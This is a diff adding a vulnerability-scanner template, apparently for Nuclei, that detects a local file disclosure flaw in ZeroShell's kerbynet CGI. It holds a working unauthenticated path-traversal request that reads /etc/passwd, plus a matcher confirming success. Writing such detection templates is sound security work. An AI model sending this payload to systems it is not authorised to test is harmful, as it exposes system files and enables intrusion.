@@ -1,0 +1,19 @@
+id: zeroshell-kerbynet-lfd
+
+info:
+  name: ZeroShell 'cgi-bin/kerbynet' - Local File Disclosure
+  author: geeknik
+  reference: https://www.exploit-db.com/exploits/28558
+  severity: high
+  tags: zeroshell,kerbynet,lfd
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
